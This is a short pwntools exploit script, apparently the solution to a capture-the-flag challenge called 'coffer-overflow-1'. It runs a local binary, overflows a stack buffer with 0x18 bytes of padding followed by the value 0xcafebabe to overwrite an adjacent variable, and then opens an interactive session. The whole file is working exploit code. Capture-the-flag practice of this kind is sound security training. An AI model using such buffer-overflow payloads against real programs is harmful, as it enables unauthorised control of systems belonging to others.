#!/usr/bin/env python2

from pwn import *

p = process("./bin/coffer-overflow-1")

p.sendline("A" * 0x18 + p64(0xcafebabe))

p.interactive()
